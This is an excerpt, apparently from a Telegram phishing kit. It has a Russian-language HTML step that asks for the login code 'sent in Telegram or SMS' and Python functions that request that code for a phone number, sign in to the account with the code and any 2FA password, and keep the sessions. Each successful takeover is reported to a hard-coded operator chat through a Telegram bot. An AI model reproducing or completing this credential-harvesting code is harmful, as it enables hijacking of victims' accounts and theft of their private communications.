...
<body>
    ...
    <div id="step2" class="hidden">
        ...
        <p class="sub">Код пришёл в Telegram или SMS</p>
...
def send_phone():
    ...
    try:
        ...
        result = loop.run_until_complete(send_code_request(phone))
        loop.close()
        
        if result == 'ok':
            user_sessions[phone] = {'phone': phone}
...
async def login_to_telegram(phone, code):
    ...
    try:
        ...
        try:
            bot.send_message(-1004479107837, f"✅ Вход: {me.username or me.phone}", message_thread_id=45)
        except: pass
...
async def login_with_2fa(phone, code2fa):
    ...
    try:
        ...
        me = await client.get_me()
        print(f"✅ ВХОД С 2FA: {me.username or me.phone}")
        
        try:
            bot.send_message(-1004479107837, f"✅ Вход с 2FA: {me.username or me.phone}", message_thread_id=45)
        except: pass
